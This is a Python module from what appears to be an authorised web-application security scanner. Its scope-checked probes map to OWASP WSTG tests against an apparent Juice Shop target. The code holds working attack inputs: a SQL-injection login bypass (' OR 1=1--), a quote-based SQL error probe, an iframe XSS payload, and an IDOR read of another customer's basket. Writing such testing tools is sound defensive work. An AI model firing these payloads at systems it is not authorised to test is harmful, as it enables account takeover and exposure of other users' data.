"""Controlled cURL probes, one small check per WSTG test case.

Every probe is non-destructive: single requests or a short fixed burst, no
data deletion, no flooding. Each URL is scope-checked before it is sent.
"""

from __future__ import annotations

import json
import re
import secrets
from collections.abc import Callable
from dataclasses import dataclass
from urllib.parse import quote

from .. import scope
from ..taxonomy import classify
from . import curl
from .drafts import FindingDraft

Log = Callable[[str], None]


@dataclass
class ProbeContext:
    base_url: str
    in_scope: list[str]
    out_of_scope: list[str]
    test_email: str = ""
    test_password: str = ""
    log: Log = print
    endpoints: list[tuple[str, str, int]] | None = None  # (method, url, status)

    def url(self, path: str) -> str:
        return self.base_url.rstrip("/") + path

    def send(self, path: str, method: str = "GET", **kw) -> curl.HttpExchange | None:
        url = self.url(path)
        try:
            scope.check(url, self.base_url, self.in_scope, self.out_of_scope)
        except scope.ScopeError as exc:
            self.log(f"skip  {method} {path}  ({exc})")
            return None
        try:
            ex = curl.request(url, method=method, **kw)
        except curl.CurlError as exc:
            self.log(f"error {method} {path}  {exc}")
            return None
        self.log(f"curl  {method} {path}  -> {ex.status}")
        if self.endpoints is not None:
            self.endpoints.append((method, url, ex.status))
        return ex


def _draft(ex: curl.HttpExchange, *, rule: str, title: str, description: str, cwe: int,
           severity: str, category: str | None = None, evidence: str = "", param: str = "",
           attack: str = "", confidence: str = "Medium", yields_to_zap: bool = False,
           zap_cwes: tuple[int, ...] = ()) -> FindingDraft:
    cat, owasp, wstg = classify(cwe, fallback=category or "info_disclosure")
    if category:
        cat = category
    return FindingDraft(
        source="curl",
        rule_id=f"curl:{rule}",
        title=title,
        description=description,
        category=cat,
        owasp=owasp,
        wstg=wstg,
        cwe_id=cwe,
        method=ex.method,
        url=ex.url,
        severity=severity,
        confidence=confidence,
        param=param,
        attack=attack,
        evidence=evidence,
        request_raw=ex.request_raw,
        response_raw=ex.response_raw,
        yields_to_zap=yields_to_zap,
        zap_cwes=zap_cwes,
    )


# -- information disclosure ------------------------------------------------

def probe_headers(ctx: ProbeContext) -> list[FindingDraft]:
    ex = ctx.send("/")
    if not ex:
        return []
    out: list[FindingDraft] = []
    if not ex.header("Content-Security-Policy"):
        out.append(_draft(
            ex, rule="header-csp", cwe=693, severity="medium", yields_to_zap=True,
            title="Content-Security-Policy header not set",
            description="The landing page is served without a Content-Security-Policy, so the browser "
                        "places no restriction on where scripts may load from. This removes a key "
                        "mitigation against cross-site scripting.",
            evidence="(header absent)",
        ))
    acao = ex.header("Access-Control-Allow-Origin")
    if acao == "*":
        out.append(_draft(
            ex, rule="cors-wildcard", cwe=942, severity="medium", category="access_control",
            yields_to_zap=True, zap_cwes=(264,),
            title="CORS allows any origin",
            description="Access-Control-Allow-Origin is '*', so any website can read responses "
                        "from this origin with JavaScript.",
            evidence=f"Access-Control-Allow-Origin: {acao}",
        ))
    for name in ("X-Powered-By", "Server"):
        value = ex.header(name)
        if value and re.search(r"\d", value):
            out.append(_draft(
                ex, rule=f"banner-{name.lower()}", cwe=497, severity="low", yields_to_zap=True,
                title=f"{name} header discloses software version",
                description=f"The {name} header reveals server software and version, which helps "
                            "an attacker pick known exploits.",
                evidence=f"{name}: {value}",
            ))
    return out


def probe_robots(ctx: ProbeContext) -> list[FindingDraft]:
    ex = ctx.send("/robots.txt")
    if not ex or ex.status != 200:
        return []
    paths = re.findall(r"(?im)^\s*disallow:\s*(\S+)", ex.body)
    if not paths:
        return []
    return [_draft(
        ex, rule="robots", cwe=200, severity="info",
        title="robots.txt lists hidden paths",
        description="robots.txt asks crawlers to avoid specific paths, which also tells an attacker "
                    "where to look. Listed: " + ", ".join(paths[:10]),
        evidence="\n".join(f"Disallow: {p}" for p in paths[:10]),
    )]


def probe_directory_listing(ctx: ProbeContext) -> list[FindingDraft]:
    out: list[FindingDraft] = []
    for path in ("/ftp", "/ftp/"):
        ex = ctx.send(path)
        if not ex or ex.status != 200:
            continue
        if re.search(r"(?i)listing directory|index of /", ex.body):
            names = re.findall(r'(?i)<a[^>]+href="[^"]*?([^"/]+\.[a-z0-9]{1,5})"', ex.body)
            out.append(_draft(
                ex, rule="dir-listing", cwe=548, severity="medium",
                title=f"Directory listing enabled at {path}",
                description="The server returns a browsable index of files. Files found in the "
                            "listing: " + (", ".join(sorted(set(names))[:15]) or "(none parsed)") + ".",
                evidence=(names[0] if names else "listing directory"),
            ))
            break
    return out


def probe_error_disclosure(ctx: ProbeContext) -> list[FindingDraft]:
    token = secrets.token_hex(4)
    ex = ctx.send(f"/api/buns-{token}")
    if not ex:
        return []
    stack = re.search(r"(?m)^\s*at .+\(.+\.js:\d+:\d+\)", ex.body) or re.search(r"at .{1,120}\.js:\d+:\d+", ex.body)
    if ex.status >= 500 or stack:
        if stack:
            return [_draft(
                ex, rule="stack-trace", cwe=209, severity="low",
                title="Stack trace returned for unknown API route",
                description="Requesting a route that does not exist returns a server-side stack trace "
                            "with internal file paths, exposing implementation details.",
                evidence=stack.group(0).strip()[:300],
            )]
    return []


# -- injection ---------------------------------------------------------------

def probe_search_sqli(ctx: ProbeContext) -> list[FindingDraft]:
    """One quote in the search term. A database error means unsanitised SQL."""
    ex = ctx.send("/rest/products/search?q=" + quote("'"))
    if not ex:
        return []
    m = re.search(r"SQLITE_ERROR[^<\n]{0,160}|SequelizeDatabaseError[^<\n]{0,160}|syntax error[^<\n]{0,120}", ex.body)
    if ex.status >= 500 and m:
        return [_draft(
            ex, rule="search-sqli-error", cwe=89, severity="high", category="injection",
            param="q", attack="'", confidence="High",
            title="SQL error from product search parameter",
            description="A single quote in the 'q' parameter of /rest/products/search breaks the SQL "
                        "statement and the database error is returned. User input is concatenated "
                        "into the query instead of being bound as a parameter.",
            evidence=m.group(0).strip(),
        )]
    return []


def probe_search_xss_reflection(ctx: ProbeContext) -> list[FindingDraft]:
    marker = f"buns{secrets.token_hex(3)}"
    payload = f"<iframe src=\"javascript:alert(`{marker}`)\">"
    ex = ctx.send("/rest/products/search?q=" + quote(payload))
    # The Juice Shop search API returns JSON; the DOM XSS happens client
    # side in /#/search. We record only when the payload comes back verbatim
    # in an HTML context, otherwise this stays silent.
    if ex and payload in ex.body and "text/html" in (ex.header("Content-Type") or ""):
        return [_draft(
            ex, rule="reflected-xss", cwe=79, severity="high", category="injection",
            param="q", attack=payload,
            title="Search term reflected unencoded in HTML",
            description="The search term is echoed back into an HTML response without encoding.",
            evidence=payload,
        )]
    return []


# -- authentication ----------------------------------------------------------

def _login(ctx: ProbeContext, email: str, password: str) -> curl.HttpExchange | None:
    return ctx.send(
        "/rest/user/login",
        method="POST",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"email": email, "password": password}),
    )


def probe_login_sqli(ctx: ProbeContext) -> list[FindingDraft]:
    payload = "' OR 1=1--"
    ex = _login(ctx, payload, "buns-probe")
    if ex and ex.status == 200 and '"token"' in ex.body:
        return [_draft(
            ex, rule="login-sqli-bypass", cwe=89, severity="critical", category="authentication",
            param="email", attack=payload, confidence="High",
            title="Login bypass with SQL injection in email field",
            description="Submitting a tautology in the email field of /rest/user/login returns a valid "
                        "session token without knowing any password. The login query is built by "
                        "string concatenation.",
            evidence='"token": [JWT issued]',
        )]
    return []


def probe_login_rate_limit(ctx: ProbeContext, attempts: int = 6) -> list[FindingDraft]:
    email = f"buns-probe-{secrets.token_hex(3)}@example.test"
    last = None
    for i in range(attempts):
        ex = _login(ctx, email, f"wrong-{i}")
        if not ex:
            return []
        last = ex
        if ex.status == 429 or ex.header("Retry-After"):
            ctx.log(f"login throttled after {i + 1} attempts")
            return []
    assert last is not None
    return [_draft(
        last, rule="login-no-throttle", cwe=307, severity="medium", category="authentication",
        title="No throttling on failed logins",
        description=f"{attempts} consecutive failed logins for the same account were all answered "
                    "normally, with no 429 response, delay or lockout. Credential stuffing and "
                    "password guessing are not slowed down. The probe stopped at "
                    f"{attempts} attempts on purpose.",
        evidence=f"{attempts} x HTTP {last.status}, no Retry-After",
    )]


def probe_password_policy(ctx: ProbeContext) -> list[FindingDraft]:
    email = f"buns-policy-{secrets.token_hex(3)}@example.test"
    body = json.dumps({"email": email, "password": "123", "passwordRepeat": "123",
                       "securityQuestion": None, "securityAnswer": ""})
    ex = ctx.send("/api/Users", method="POST", headers={"Content-Type": "application/json"}, body=body)
    if ex and ex.status in (200, 201) and '"id"' in ex.body:
        return [_draft(
            ex, rule="weak-password-policy", cwe=521, severity="medium", category="authentication",
            param="password", attack="123",
            title="Registration accepts a 3-character password",
            description="A new account was created through /api/Users with the password '123'. The "
                        "server enforces no minimum length or complexity. The account uses a "
                        "synthetic example.test address.",
            evidence='"password": "123" accepted, account created',
        )]
    return []


# -- access control ------------------------------------------------------------

def probe_access_control(ctx: ProbeContext) -> list[FindingDraft]:
    out: list[FindingDraft] = []

    anon = ctx.send("/api/Users")
    if anon and anon.status == 200 and '"email"' in anon.body:
        out.append(_draft(
            anon, rule="users-anon", cwe=284, severity="high", category="access_control",
            title="User list readable without logging in",
            description="/api/Users returns account records to an unauthenticated request.",
            evidence="HTTP 200 with user records",
        ))

    if not (ctx.test_email and ctx.test_password):
        ctx.log("skip  access-control checks with a session (no test account on target)")
        return out

    login = _login(ctx, ctx.test_email, ctx.test_password)
    if not login or login.status != 200:
        ctx.log("skip  test account login failed; check the credentials on the target")
        return out
    try:
        auth = json.loads(login.body).get("authentication", {})
    except ValueError:
        return out
    token, bid = auth.get("token"), auth.get("bid")
    if not token:
        return out
    hdr = {"Authorization": f"Bearer {token}"}

    users = ctx.send("/api/Users", headers=hdr)
    if users and users.status == 200:
        try:
            count = len(json.loads(users.body).get("data", []))
        except ValueError:
            count = 0
        if count > 1:
            out.append(_draft(
                users, rule="users-any-session", cwe=285, severity="high", category="access_control",
                title="Any logged-in user can list every account",
                description=f"With an ordinary customer session, /api/Users returned {count} user "
                            "records including other customers' emails and roles. The endpoint "
                            "checks that a session exists, not that the caller is an admin.",
                evidence=f"HTTP 200, {count} records returned to a customer token",
            ))

    if isinstance(bid, int):
        other = bid + 1 if bid != 1 else 2
        basket = ctx.send(f"/rest/basket/{other}", headers=hdr)
        if basket and basket.status == 200:
            try:
                data = json.loads(basket.body).get("data") or {}
            except ValueError:
                data = {}
            if data.get("id") == other:
                out.append(_draft(
                    basket, rule="basket-idor", cwe=639, severity="high", category="access_control",
                    param="id", attack=str(other), confidence="High",
                    title="Customer can read another customer's basket",
                    description=f"The test account owns basket {bid} but /rest/basket/{other} returned "
                                "basket contents belonging to a different user. The basket id in the "
                                "path is trusted without an ownership check (IDOR).",
                    evidence=f'requested basket {other}, own basket {bid}, response "id": {other}',
                ))
    return out


RECON_PROBES = (probe_headers, probe_robots)

CATEGORY_PROBES: dict[str, tuple] = {
    "info_disclosure": (probe_directory_listing, probe_error_disclosure),
    "injection": (probe_search_sqli, probe_search_xss_reflection),
    "authentication": (probe_login_sqli, probe_login_rate_limit, probe_password_policy),
    "access_control": (probe_access_control,),
}


def run_probes(ctx: ProbeContext, categories: list[str]) -> list[FindingDraft]:
    """Run recon probes plus the probes for each selected category.

    Exceptions in a single probe are logged and skipped so one failure does
    not abort the whole run.
    """
    drafts: list[FindingDraft] = []
    selected = list(RECON_PROBES)
    for cat in categories:
        selected.extend(CATEGORY_PROBES.get(cat, ()))

    seen = set()
    for probe in selected:
        if probe in seen:
            continue
        seen.add(probe)
        try:
            drafts.extend(probe(ctx))
        except Exception as exc:  # pragma: no cover - defensive
            ctx.log(f"probe {probe.__name__} raised {type(exc).__name__}: {exc}")
    return drafts
